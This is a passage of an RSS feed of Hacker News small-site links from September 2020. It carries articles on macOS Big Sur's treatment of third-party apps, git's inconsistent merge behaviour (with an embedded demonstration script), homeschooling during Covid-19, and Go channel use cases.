<li>Beautiful.AI</li>
</ul>
<p>Regardless of which solution you choose, remember that the design, while being professional and streamlined, is not the star of the show. It is merely the backdrop for your information. Think of it as wearing a subdued, well-fitting outfit to an interview. It sets the stage but does not distract from the candidate.</p>
<p>As with any presentation, do not put all of your details on your slides. You do not want your audience to read from a screen. Instead, you want them to focus on the content and engaging with you.</p>
<p><em>Proofing</em></p>
<p>You have only one chance to make a first impression. Proof, proof, and proof your pitch deck again. Share it with other members of your team. If you have trusted people outside of your team, share it with them. Glaring errors often become invisible to us when we are deeply immersed ‚Ä¶</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://bryllyant.com/blog/creating-a-pitch-deck-for-your-new-tech/">https://bryllyant.com/blog/creating-a-pitch-deck-for-your-new-tech/</a></em></p>]]>
            </description>
            <link>https://bryllyant.com/blog/creating-a-pitch-deck-for-your-new-tech/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24592912</guid>
            <pubDate>Fri, 25 Sep 2020 18:48:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[React app from scratch in 10 minutes]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24592903">thread link</a>) | @markhkr
<br/>
September 25, 2020 | https://marlom.dev/react-app-from-scratch | <a href="https://web.archive.org/web/*/https://marlom.dev/react-app-from-scratch">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://marlom.dev/react-app-from-scratch</link>
            <guid isPermaLink="false">hacker-news-small-sites-24592903</guid>
            <pubDate>Fri, 25 Sep 2020 18:47:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[macOS Big Sur: Has the Dust Finally Settled on Limiting Third-Party Apps?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24592616">thread link</a>) | @pcr910303
<br/>
September 25, 2020 | https://blog.robenkleene.com/2020/06/25/macos-big-sur-has-the-dust-settled-on-limiting-third-party-apps/ | <a href="https://web.archive.org/web/*/https://blog.robenkleene.com/2020/06/25/macos-big-sur-has-the-dust-settled-on-limiting-third-party-apps/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <section id="post">
          <article>
            <header>
              <time datetime="">Thursday, Jun 25, 2020</time>
              
            </header>

<p>Apple‚Äôs strategy for years has been to <a href="https://mjtsai.com/blog/2013/10/23/iwork-13-a-huge-regression/">trade desktop power for cross-device feature parity</a>. As expected, <a href="https://www.apple.com/macos/big-sur-preview/">macOS Big Sur</a> continues this trend, emphasizing a consistent user interface across devices, and focusing on cross-device development technologies like <a href="https://developer.apple.com/xcode/swiftui/">SwiftUI</a> and <a href="https://developer.apple.com/mac-catalyst/">Catalyst</a>.</p>

<p>Personally, I wish Apple had different priorities. I‚Äôd like to see more apps like <a href="https://www.sketch.com/">Sketch</a>, an industry-leading creative app that‚Äôs built top to bottom on Apple technologies. But Sketch was released in 2010, and Apple hasn‚Äôt created any new frameworks like <a href="https://developer.apple.com/documentation/coregraphics">Core Graphics</a> and <a href="https://developer.apple.com/documentation/coreimage">Core Image</a> that support these kinds of apps in over a decade. So I wasn‚Äôt holding my breath for them to announce anything new for these kinds of apps at <a href="https://developer.apple.com/wwdc20/">WWDC</a> this year.</p>

<p>Since Apple isn‚Äôt prioritizing powerful desktop apps with their own technologies, that means supporting these use cases mostly falls on third parties. This is where companies like <a href="https://creativecloud.adobe.com/?promoid=29NMCNT6&amp;mv=other">Adobe</a>, <a href="https://www.avid.com/">Avid</a>, <a href="https://www.maxonlift.com/">Maxon</a>, and <a href="https://www.microsoft.com/en-us/">Microsoft</a> come in. While Apple‚Äôs priorities regarding their own technologies have been clear for awhile now, what hasn‚Äôt been clear is their priorities for third-party apps, in particular, ones that aren‚Äôt sandboxed. The trend for the last few years has been making it harder to develop these kinds of apps for macOS. <a href="https://www.felix-schwarz.org/blog/2018/08/new-apple-event-apis-in-macos-mojave">AEpocalypse</a> (2018), <a href="https://mjtsai.com/blog/2019/07/23/annoying-catalina-security-features/">Catalina‚Äôs security features</a> (2019), and <a href="https://developer.apple.com/documentation/xcode/notarizing_macos_software_before_distribution">Notarization</a> (2018) are all examples of this trend.</p>

<p>The overarching reason behind the changes that make developing these kinds of apps harder is ‚ÄúSecurity‚Äù. And unlike cross-device feature parity, it‚Äôs unclear exactly where this all ends. Because after all, the most secure system there is is the one that doesn‚Äôt run any software at all. That‚Äôs why it‚Äôs such a pleasant surprise, that, as far as I can tell, Apple has done everything they can to make Big Sur, and the accompanying transition to <a href="https://www.apple.com/newsroom/2020/06/apple-announces-mac-transition-to-apple-silicon/">Apple Silicon</a>, as seamless as possible, even for apps that aren‚Äôt sandboxed.</p>

<p>Some were predicting that Macs on Apple Silicon wouldn‚Äôt even run apps from outside of the Mac App Store, that didn‚Äôt happen. It <a href="https://shapeof.com/archives/2020/6/educated_guesses_about_a_mac_transition_to_arm.html">seemed more likely</a> that Apple would drop <a href="https://en.wikipedia.org/wiki/OpenCL">OpenCL</a> and <a href="https://en.wikipedia.org/wiki/OpenGL">OpenGL</a>, but those are <a href="https://twitter.com/colincornaby/status/1275153748348682240">sticking along for the ride</a>. No details were known about whether there would be an emulation layer like the <a href="https://en.wikipedia.org/wiki/Rosetta_%28software%29">original Rosetta</a> from the <a href="https://en.wikipedia.org/wiki/Apple's_transition_to_Intel_processors">2006 Intel transition</a>. Apple appears to have gone above in beyond with <a href="https://developer.apple.com/documentation/apple_silicon/about_the_rosetta_translation_environment">Rosetta 2</a>, which even supports plug-ins like <a href="https://en.wikipedia.org/wiki/Virtual_Studio_Technology">VSTis</a>, giving lots of options for migration paths for powerful modular software.</p>

<p>I‚Äôm still frustrated that there probably won‚Äôt be another Sketch for the foreseeable future, but that ship sailed a long time ago. And no other platform has a Sketch either, an industry defining app that‚Äôs a platform exclusive, so while Apple has lost a unique advantage that only they had, they haven‚Äôt lost anything that other platforms already have. Other platforms can run powerful modular software that‚Äôs distributed outside the Mac App Store, but today, so can new Macs running Big Sur. Here‚Äôs to hoping that the dust has settled, and the last of the restrictions on third-party apps are behind us now.</p>


          </article>
        </section>


      </div></div>]]>
            </description>
            <link>https://blog.robenkleene.com/2020/06/25/macos-big-sur-has-the-dust-settled-on-limiting-third-party-apps/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24592616</guid>
            <pubDate>Fri, 25 Sep 2020 18:18:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Git Is Inconsistent]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24592546">thread link</a>) | @pcr910303
<br/>
September 25, 2020 | http://r6.ca/blog/20110416T204742Z.html | <a href="https://web.archive.org/web/*/http://r6.ca/blog/20110416T204742Z.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p>Zooko provides <a title="badmerge -- abstract version" href="http://tahoe-lafs.org/~zooko/badmerge/simple.html">a nice example</a> of the problems with most distributed version control systems merge algorithms.  He gives an example of a merge situation that most version control systems, including git, get wrong, but that darcs, Codeville, SCCS, and perhaps BitKeeper get correct.</p><p>Still there are <a title="badmerge -- concrete version with bad semantics" href="http://tahoe-lafs.org/~zooko/badmerge/concrete-bad-semantics.html">some people</a> who argue either that method git does is correct, or that there is no right or wrong way to merge and the results are just different.  Rather than argue that git‚Äôs method is right or wrong, I want to argue that git method (and other‚Äôs like git) is inconsistent.</p><p>The problem with git‚Äôs merging is that it doesn‚Äôt satisfy the ‚Äúmerge associativity law‚Äù which states that merging change <var>A</var> into a branch followed by merging change <var>B</var> into the branch gives the same results as merging both changes in together in one merge.</p><p>The source of Zooko‚Äôs bad merge stems from a failure to follow the merge associativity law.
I have modified <a href="data:text/plain;base64,IyEvYmluL3NoCnJtIC1yZiB0ZXN0IHRlc3QyCm1rZGlyIHRlc3QKY2QgdGVzdApnaXQgaW5pdApjYXQgPmZpbGUgPDxFT0YKQQpCCkMKRApFCkVPRgpnaXQgYWRkIGZpbGUKZ2l0IGNvbW1pdCAtYSAtbSAiYSIKY2QgLi4KZ2l0IGNsb25lIHRlc3QgdGVzdDIKY2QgdGVzdApybSBmaWxlOyBjYXQgPmZpbGUgPDxFT0YKQQpCCmNoYW5nZWQgQwpECkUKRU9GCmdpdCBjb21taXQgLWEgLW0gImMxIgpjZCAuLi90ZXN0MgpybSBmaWxlCmNhdCA+ZmlsZSA8PEVPRgojCiMKIwpBCkIKQwpECkUKRU9GCmdpdCBjb21taXQgLWEgLW0gImIxIgpjZCAuLi90ZXN0CmdpdCBwdWxsIC4uL3Rlc3QyCmNkIC4uL3Rlc3QyCnJtIGZpbGUKY2F0ID5maWxlIDw8RU9GCkEKQgpDCkQKRQojCiMKIwpBCkIKQwpECkUKRU9GCmdpdCBjb21taXQgLWEgLW0gImIyIgpjZCAuLi90ZXN0CmdpdCBwdWxsIC4uL3Rlc3QyCmNhdCBmaWxlCmVjaG8gXl4gcHVsbGluZyBvbmUgcGF0Y2ggYXQgYSB0aW1lCnJlYWQKY2QgLi4Kcm0gLXJmIHRlc3QgdGVzdDIKbWtkaXIgdGVzdApjZCB0ZXN0CmdpdCBpbml0CmNhdCA+ZmlsZSA8PEVPRgpBCkIKQwpECkUKRU9GCmdpdCBhZGQgZmlsZQpnaXQgY29tbWl0IC1hIC1tICJhIgpjZCAuLgpnaXQgY2xvbmUgdGVzdCB0ZXN0MgpjZCB0ZXN0CnJtIGZpbGU7IGNhdCA+ZmlsZSA8PEVPRgpBCkIKY2hhbmdlZCBDCkQKRQpFT0YKZ2l0IGNvbW1pdCAtYSAtbSAiYzEiCmNkIC4uL3Rlc3QyCnJtIGZpbGUKY2F0ID5maWxlIDw8RU9GCiMKIwojCkEKQgpDCkQKRQpFT0YKZ2l0IGNvbW1pdCAtYSAtbSAiYjEiCnJtIGZpbGUKY2F0ID5maWxlIDw8RU9GCkEKQgpDCkQKRQojCiMKIwpBCkIKQwpECkUKRU9GCmdpdCBjb21taXQgLWEgLW0gImIyIgpjZCAuLi90ZXN0CmdpdCBwdWxsIC4uL3Rlc3QyCmNhdCBmaWxlCmVjaG8gXl4gcHVsbGluZyBib3RoIHBhdGNoZXMgdG9nZXRoZXI%3D">a shell script</a> written by <a title="RFC: migrating to git" href="http://www.haskell.org/pipermail/glasgow-haskell-users/2011-January/019801.html">Simon Marlow</a> that illustrates, using git, how merging two patches separately can give different results than merging two patches together.</p><p>In the first case, merging both patches separately, the history looks as follows.</p><p><img alt="[screen shot from gitk showing twos merges with one patch each]" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAKcAAABYBAMAAABi%2FPoTAAAAA3NCSVQICAjb4U%2FgAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAHnRFWHREZXNjcmlwdGlvbgBXaW5kb3cgQ2xhc3M6IGdpdGtmRf4cAAAAEHRFWHRUaXRsZQBnaXRrOiB0ZXN0aa%2B2ZgAAAB5QTFRFAAAAAAD%2FAP8ApSoqqamp2dnZ%2FwAA%2FwD%2F%2F%2F8A%2F%2F%2F%2F1%2BMFVQAAAq5JREFUWMPt2bFO5DAQBuAfn0Z30%2BGSLvIrpKLnAdzMK%2FAKEd2VWw6iQPO2V9iOnSXZXS7OSScwFNYu%2BzH2eCYWwPoPxX%2BJKrZGel9uG2do2BhDPxQfUBIRWmGovEgCyqiCb0MhEi%2BjUWJGf51%2BZ9TBwQUgDHD52%2BEcBQlRJBJkK0YISCJFSEH1dDpxQhEQMLjBIeSvAQ1KJERRokAoUpSY0RQhRSERqmhKcpbC4OBCQcMKSkJS0TwnEZIoGyjgAlxAADC4Fo1RKAIZBSoKSCQhIdlefhjmoD%2BgiUmTGmnZBqmJeljb0wHhLNK60mZPo9Q9rajizjdogMMAF4aU%2FXNUQEIyZ59iFMnZF0SgHP5n8w%2Bfrii6UlHP9uo%2FidINqPmHzzWUCLmOvvrere%2FZUqjd0SZUNrPcY3ai5u8LxGZq2gV9vfP3GYVZJ1S99ylUGKc96Imy8Z5At1E%2BAN0TaIvanCh0RHU%2BUjAF%2BqA2da%2Bob%2FRQlG29SpnnH7jYxBZ3qYLCTC%2Bjl5uYojn1SxRszMo1KlUY2JQVdhWd63OqETGrqcFYa1SaImS91sQK%2BnN6WUE5tQG12hKyqHYTOjWoqrECGS0Vm%2Bd6tYnV5U8vZ2jpgXNQZa7X%2Bk1N1PvUHKl5pc2eqtU9vQFNR2p6WaAGNrY5%2B6xqlrNvuNzE0uF%2FMjN7n1Yr6i8eAQ1qayjvRd%2Bnrfd3oJ0byr9A2azDc%2F8pz5u7FDqhi7tUp0iXd6nuKH9FdHGXOuBI9cu%2B2XhERX2jx6K7s1%2FO0nj%2By%2Fag5dSPzYt7I53rs6A9ylS99z%2FGxxa1TujYH2UbH7uiKVFvY9c9zUdqfOyZ%2FTzexr4VlQvqCPTtCNS%2BNqp7%2FsC1hc6P6L3%2F%2B2g%2Bv7xMdEftCHTv5h69%2FObS2xGdV63Qbmi38dXRPx7M%2F1IzRYuPAAAAAElFTkSuQmCC"></p><p><ins datetime="2011-04-17T07:55:35Z">and results in the file:</ins></p><pre><ins datetime="2011-04-17T07:55:35Z">A
B
C
D
E
#
#
#
A
B
changed C
D
E</ins></pre>
<p>In the second case, merging both patches together in one merge, the history looks as follows.</p><p><img alt="[screen shot from gitk showing one merge with two patches]" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAKcAAABJBAMAAACqdistAAAAA3NCSVQICAjb4U%2FgAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAHnRFWHREZXNjcmlwdGlvbgBXaW5kb3cgQ2xhc3M6IGdpdGtmRf4cAAAAEHRFWHRUaXRsZQBnaXRrOiB0ZXN0aa%2B2ZgAAABhQTFRFAAAAAAD%2FAP8A2dnZ%2FwAA%2FwD%2F%2F%2F8A%2F%2F%2F%2FvoR41wAAAfdJREFUWMPt2DtuIzEMBuA%2FIrJqo8qtoBMQ%2BK%2FgKwzcbuVaLgxefwtpHnE8GxvDKQJHdjEYwx8okdQ8YP6j4keiFWuj%2Fc7Hxg1aVkb2Q%2FEFFZJyh5HxpBDS0Yr4GApS%2F48qtaN%2Fzn87GhAQClAyQv8G3KIQiqgI0S1VEEIVBUe0ns%2Fn2FAUFOSQA0r%2FZCxQEYoolaCoKLWjLUJRCikz2pLcpZIDQhnRcgcVCme0HwspVK6gQCgIBQVADktUlaJAR4EZBahCoXB9%2BiVPQX9BG9MO5kjHZeCcqMO9Nc0oN5HOM12sqXJe0xmteEsLtCAgI5Tcsn%2BLEkLhlH1RJXv2CQXG4j9aOjzdUfJNRx3tkp5E5QHU0uG5DUXB79FL8t76jtZCdUcXoUYz63vMRtTSxwhFs2rVBb28pY%2BOwswJrSmlFiostjXwRKPFLYGuo3EHtPqUlNmUKDiidSopWAV8UEvuHfWL7orGba2%2FUlIb71vvFn%2BE%2Bfc%2B9tpQXg79tEvtUFJ%2B2Tcb9uioX3RfdHP2x1oanJ6uKxZVPyxObo106s9h2qSjC%2Fo%2BnJaoOaGDPxptOLmiLVHXwXVNe0kNJ8%2Fs93EdfDuqN9Qe6HUP1F4brVseHdfQ6RK99a3i4v%2BfbybcUdsD3bq4e09%2FcdPriE6zrqh%2Bxf%2BCb8%2F%2FAZNSkIgpBwF%2FAAAAAElFTkSuQmCC"></p><p><ins datetime="2011-04-17T07:55:35Z">and results in the file:</ins></p><pre><ins datetime="2011-04-17T07:55:35Z">A
B
changed C
D
E
#
#
#
A
B
C
D
E</ins></pre>
<p>Roughly speaking, the merge associativity law states that having extra "rungs" in the history "ladder" between two branches ought not to make a difference in the final result.</p><p>There are still some people who still think nothing is wrong with git; that it is okay for the result of a merge to depend on how things are merged rather than on only what is merged; that is it okay for two git repositories that pull the same patches to have different contents depending on how they pulled those patches.  I don‚Äôt know what to say to those people.  Such a view seems like insanity to me.

</p></div></div>]]>
            </description>
            <link>http://r6.ca/blog/20110416T204742Z.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24592546</guid>
            <pubDate>Fri, 25 Sep 2020 18:12:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Filecoin 101 [video]]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24592393">thread link</a>) | @simonebrunozzi
<br/>
September 25, 2020 | https://www.pscp.tv/w/1LyxBaLLkpYJN | <a href="https://web.archive.org/web/*/https://www.pscp.tv/w/1LyxBaLLkpYJN">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.pscp.tv/w/1LyxBaLLkpYJN</link>
            <guid isPermaLink="false">hacker-news-small-sites-24592393</guid>
            <pubDate>Fri, 25 Sep 2020 17:58:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Reluctantly homeschooling during Covid-19]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24592346">thread link</a>) | @gregorymichael
<br/>
September 25, 2020 | https://baugues.com/homeschool/ | <a href="https://web.archive.org/web/*/https://baugues.com/homeschool/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
				<p>My wife and I became reluctant homeschoolers this year. Not the "fully remote" kind of homeschooling, but the "unenroll our kid and go at it alone" kind. </p><p>We didn't decide to homeschool for theological reasons. Rachel and I come from evangelical backgrounds, but if we wanted to raise our daughter in a bubble, we wouldn't have <a href="https://baugues.com/moving-to-brooklyn">moved to Brooklyn four years ago</a>. We didn't decide to homeschool because we had a bad public school experience. We had a great public school experience. Universal Pre-K exceeded all our expectations, as did kindergarten at <a href="https://baugues.com/p/cd58703c-7f95-45a3-91b8-7a64f30fcc26/ps32.org">PS 32</a>. </p><p>Quick story about PS 32 ‚Äì A few days after we found out Emma had been accepted into their gifted and talented program, and several weeks before school started, we attended an informational DOE meeting and coincidentally sat next to Ms. Watson-Adin, the principal of PS 32. After the presentation, we introduced ourselves and told her that we had registered our daughter for PS 32 that morning.</p><p>"What's her name?" Ms. Watson-Adin asked. </p><p>"Emma." </p><p>"Emma Baugues?" </p><p>Our jaws dropped a bit. "How do you know her name?" </p><p>"I know all my kids' names," she replied.</p><p>"How many kids do you have?" </p><p>"About five hundred." </p><p>Our respect for Ms. Watson-Adin's dedication to her students has only increased since. We were skeptical of New York public schools before we started ‚Äì but we had a wonderful experience. They're imperfect, but there was no point between Pre-K and Covid-19 where we thought, "We could do a better job than they're doing." </p><p>Hence, our reluctance to pull Emma out. </p><p>We're about four weeks into our homeschool experiment, and it's going well enough that I feel some sense of obligation/opportunity to share our story in hopes that it helps other parents navigate the difficult choices to be made this year. That said, I want to acknowledge that we're operating from a privileged position. We have one daughter. She's in first grade. We're expecting our second daughter in November. My wife, Rachel, has been a stay-at-home mom since Emma was born. I work for a software company and have been working from home since March. </p><p>The stars aligned to make homeschooling an easy decision <em>for us.</em> I don't want to imply that everyone else should make the same decision, and I know that a lot of folks simply <em>can't</em>. That said, homeschooling is an interesting alternative to remote learning, and we haven't heard a lot of folks talk about it. </p><p>Schools in NYC shutdown on March 16, 2020. April through June, we finished out Kindergarten via remote learning. Ms. Watson-Adin and our teachers and made a heroic effort to make it work, but between five year olds on Zoom and everyone suffering through the onset of a global pandemic, I think it's fair to say remote learning in Spring 2020 was a wash. </p><p>Coming into September, we felt we had three choices:</p><ol><li>Hybrid learning. A few days in the building, a few days remote. </li><li>Remote learning. Do public school from home. </li><li>Homeschool. Decouple ourselves from the public school system altogether. &nbsp;</li></ol><p>Here's how we evaluated those options, and why we eventually decided to homeschool Emma. </p><h2 id="option-1-hybrid-learning">Option 1: Hybrid Learning </h2><p>The first question to wrestle with was, "Do we feel comfortable sending her into the building?" The answer here was, "No." </p><p>Based on our <a href="https://baugues.com/coming-over">mental model of how Covid-19 spreads</a> ‚Äì by breathing the same air as an infected person for a prolonged duration ‚Äì we don't believe teachers and administrators can make the in-class experience safe. Even if they were getting adequate training, funding, and guidance from local and federal government ‚Äì <strong>which they're not</strong> ‚Äì they can't defy physics. </p><p>But, even if Emma was somehow immune to Covid-19, I'd be concerned about the learning environment that she'd find at school this year. Teaching public school was hard <em>before</em> the pandemic. Now we're asking teachers and administrators to put their lives at risk to teach under unprecedented conditions. We know that stress and trauma makes it harder for adults to do their job, and makes it harder for kids to do well in school. Schools this year will have a lot of stress and trauma. </p><p>That fact that Rachel and I don't <em>need </em>childcare made it an easy decision to keep Emma home. </p><h2 id="option-2-remote-learning">Option 2 - Remote Learning</h2><p>Any parent not sending their kid into the building is "homeschooling" to some extent. The questions are, "What curriculum do you use?" and "Who's the teacher?" The default solution is to use your local school's remote learning option, but it might make sense to step back and ask, "are the reasons we chose that school last year still valid?" </p><p>Overgeneralizing here, but parents choose a school to meet three needs: </p><ol><li>Education </li><li>Childcare </li><li>Community</li></ol><p>Before Covid, <em>proximity</em> was the primary factor when choosing a school. You can't get childcare and community unless you're close. This year, your local school's value proposition changed. </p><p><strong>Community.</strong> Emma, Rachel, and I all benefitted<em> </em>greatly from the social aspects of in-person public school. Each of us have met many good friends there. Unfortunately, Emma didn't get much socialization benefit from daily Zoom calls with fifteen five year olds in the Spring, and parent-to-parent interaction is close to nil when you remove in-person activities. </p><p>Now, that's considering what we <em>get</em> when it comes to community. PS 32 also is a place for us to <em>give</em>. When <a href="https://baugues.com/p/cd58703c-7f95-45a3-91b8-7a64f30fcc26/deray.com">DeRay McKesson</a> speaks about the difference between a <em>resident </em>of a community versus a <em>citizen</em> of a community, he uses the example of <em>citizens</em> choosing to invest in the local public school even if they don't have kids in it. Last year, Rachel and I felt an obligation to invest in PS 32, which we did by volunteering at the school and contributing to the PTA. We've committed to doing the same this year, even if Emma's not enrolled.</p><p><strong>Childcare. </strong>As a society, I don't think we fully appreciated the childcare component of schools until a whole bunch of parents couldn't go to work because they didn't have a safe place to put their kids. In our case, school meant Rachel had a few hours a day when she could run errands, prep meals, clean the house, or practice self-care after five years of taking care of a kid full-time. Those hours were especially valuable when I was on the road for work. </p><p>We're not getting a childcare benefit from school this year. </p><p><strong>Education. </strong>When it comes to collocated education, PS 32 did a better job educating Emma than we would have. Full stop. Her kindergarten teacher, Ms. Ryan, has been described by many parents as "Marry Poppins." She is <em>so good. </em>Emma's teachers at PS 32 for art, music, dance, gym, and science are <em>so good. </em></p><p>Now that learning has moved online, it's worth asking, <em>"</em>What are the odds that the NYC Department of Education ‚Äì an underfunded, technologically incompetent bureaucracy that's been thinking about remote learning for six months ‚Äì is the best available provider of in-home elementary education?" </p><p>In the startup world, we consistently see small scrappy startups outmaneuver incumbents because they can laser focus on a single problem and change directions quickly. The DOE employees over 75,000 teachers, is constrained by decades of regulation and powerful unions, and has a mandate to equitably serve over 1.1 million students. It'd be hard to design an institution that's less capable of adapting to change. Alas, they're trying to tackle two big challenges simultaneously: safely reopening the buildings and rolling out remote education. </p><p>People and institutions get better at doing things via a feedback cycle of: <em>Do the thing -&gt; Get Feedback -&gt; Make Improvements -&gt; Repeat.</em> The DOE is, charitably, on its second iteration of this cycle. There's little reason to believe that the DOE will be the best provider of in-home education this year. There's little reason to believe that they'll even be competent at it. That's not to take anything away from the teachers, staff, and administrators. They are working <em>so damn hard. </em>The people are great. The institution is ineffective. </p><p>Is it possible that there are educational service providers who are more adaptable to change and who have been been iterating on in-home education for years? </p><h2 id="option-3-homeschooling">Option 3 - Homeschooling</h2><p>That town hall meeting also made us realize that everything DOE related was going to be chaos this year. Start dates get pushed back at the last minute. Teachers don't have classroom assignments yet. Five different services to sign into, all with different credentials. Zoom for five hours a day starting at 8:30am.... and then somedays there no live instruction at all. Any given day your school might have an outbreak that shoves everything into disarray. Parents stressed out and venting their anxiety in all different directions. </p><p>There's a lot of chaos consuming mental cycles before the teaching even begins. </p><p>Shortly after that town hall, we decided to decouple ourselves from the chaos. We <a href="https://www.schools.nyc.gov/enrollment/enrollment-help/home-schooling">sent our letter of intent to homeschool to the DOE</a>. </p><figure><img src="https://baugues.com/content/images/2020/09/Screen-Shot-2020-09-19-at-9.22.22-PM.png"></figure><p>We emailed Ms. Watson-Adin to let her know that we were pulling Emma out but hoped to send her back to PS 32 in 2021. Ms. Watson-Adin called us fifteen minutes later. She said she was sad we were leaving, but that she understood, and that Emma would be welcomed back next year. She talked about a few of the absurdly difficult problems she was trying to solve that week, and said, "all we can do is one day at a time." We told her that we appreciated all the work she was doing and would continue to support her and the school however we could. &nbsp;</p><p>Then we started to figure out how to homeschool. </p><p>We started by googling, "secular homeschool curriculum." We're still figuring out what to tell Emma about God, but we don't need the same person who creates that material writing our Math book. After evaluating several providers, we ordered the Age 5-7 curriculum from <a href="https://movingbeyondthepage.com/">Moving Beyond the Page</a>, which cost about $600. We got immediate access to the digital curriculum. A few weeks later, first grade showed up at our door: </p><figure><img src="https://baugues.com/content/images/2020/09/L1050067.jpg"></figure><figure><img src="https://baugues.com/content/images/2020/09/IMG_20200829_121832.jpg"></figure><p>In our house, first grade started in mid-August. It's only been four weeks, so I can tell you what we've been doing, but it'll be a ‚Ä¶</p></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://baugues.com/homeschool/">https://baugues.com/homeschool/</a></em></p>]]>
            </description>
            <link>https://baugues.com/homeschool/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24592346</guid>
            <pubDate>Fri, 25 Sep 2020 17:53:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Golang Channel Use Cases]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24592242">thread link</a>) | @tapirl
<br/>
September 25, 2020 | https://www.go101.org/article/channel-use-cases.html | <a href="https://web.archive.org/web/*/https://www.go101.org/article/channel-use-cases.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<div>

	<p>Go Practice 101</p>

	<p>Go 101 Tools</p></div><p><small>
<b><a href="https://github.com/go101/gold">Gold</a></b>, an experimental Go local docs server, Go docs generation tool, and code reader. <span><sup>NEW!</sup></span>
<br>-- show type implemention relations --
<br>-- show code statistics --
<br>-- smooth code view experiences --
<br>-- and more... --
</small></p>





<div>
<p>
Before reading this article, please read the article
<a href="https://www.go101.org/article/channel.html">channels in Go</a>,
which explains channel types and values in detail.
New gophers may need to read that article and the current one several times
to master Go channel programming.
</p><p>

The remaining of this article will show many channel use cases.
I hope this article will convince you that
</p><ul>
<li>
	asynchronous and concurrency programming with Go channels is easy and enjoyable.
</li>
<li>
	the channel synchronization technique has a wider range of uses
	and has more variations than the synchronization solutions used in some other languages,
	such as <a href="https://en.wikipedia.org/wiki/Actor_model">the actor model</a>
	and the <a href="https://en.wikipedia.org/wiki/Async/await">async/await pattern</a>.
</li>
</ul>

<p>
Please note that the intention of this article is to show
as many channel use cases as possible.
We should know that channel is not the only concurrency synchronization technique supported in Go,
and for some cases, the channel way may not be the best solution.
Please read <a href="https://www.go101.org/article/concurrent-atomic-operation.html">atomic operations</a> and
<a href="https://www.go101.org/article/concurrent-synchronization-more.html">some other synchronization techniques</a>
for more concurrency synchronization techniques in Go.
</p>

</div>

<h3>Use Channels as Futures/Promises</h3>

<p>
Futures and promises are used in many other popular languages.
They are often associated with requests and responses.
</p>

<h4>Return receive-only channels as results</h4>

<div>
<p>
In the following example, the values of two arguments of the
<code>sumSquares</code> function call are requested concurrently.
Each of the two channel receive operations will block until
a send operation performs on the corresponding channel.
It takes about three seconds instead of six seconds to return the final result.
</p>

<pre><code>package main

import (
	"time"
	"math/rand"
	"fmt"
)

func longTimeRequest() &lt;-chan int32 {
	r := make(chan int32)

	go func() {
		// Simulate a workload.
		time.Sleep(time.Second * 3)
		r &lt;- rand.Int31n(100)
	}()

	return r
}

func sumSquares(a, b int32) int32 {
	return a*a + b*b
}

func main() {
	rand.Seed(time.Now().UnixNano())

	a, b := longTimeRequest(), longTimeRequest()
	fmt.Println(sumSquares(&lt;-a, &lt;-b))
}
</code></pre>



</div>

<h4>Pass send-only channels as arguments</h4>

<div>
<p>
Same as the last example,
in the following example, the values of two arguments of the
<code>sumSquares</code> function call are requested concurrently.
Different to the last example, the <code>longTimeRequest</code> function
takes a send-only channel as parameter instead of
returning a receive-only channel result.
</p>

<pre><code>package main

import (
	"time"
	"math/rand"
	"fmt"
)

func longTimeRequest(r chan&lt;- int32)  {
	// Simulate a workload.
	time.Sleep(time.Second * 3)
	r &lt;- rand.Int31n(100)
}

func sumSquares(a, b int32) int32 {
	return a*a + b*b
}

func main() {
	rand.Seed(time.Now().UnixNano())

	ra, rb := make(chan int32), make(chan int32)
	go longTimeRequest(ra)
	go longTimeRequest(rb)

	fmt.Println(sumSquares(&lt;-ra, &lt;-rb))
}
</code></pre>

<p>

In fact, for the above specified example,
we don't need two channels to transfer results.
Using one channel is okay.

</p><pre><code>...

	// The channel can be buffered or not.
	results := make(chan int32, 2)
	go longTimeRequest(results)
	go longTimeRequest(results)

	fmt.Println(sumSquares(&lt;-results, &lt;-results))
}
</code></pre>

<p>
This is kind of data aggregation which will be introduced specially below.
</p>

</div>

<h4>The first response wins</h4>

<div>

<p>
This is the enhancement of the using-only-one-channel variant in the last example.
</p>

<p>
Sometimes, a piece of data can be received from several sources to avoid high latencies.
For a lot of factors, the response durations of these sources may vary much.
Even for a specified source, its response durations are also not constant.
To make the response duration as short as possible,
we can send a request to every source in a separated goroutine.
Only the first response will be used, other slower ones will be discarded.
</p>

<p>
Note, if there are <i>N</i> sources, the capacity of
the communication channel must be at least <i>N-1</i>,
to avoid the goroutines corresponding the discarded responses being blocked for ever.
</p>

<pre><code>package main

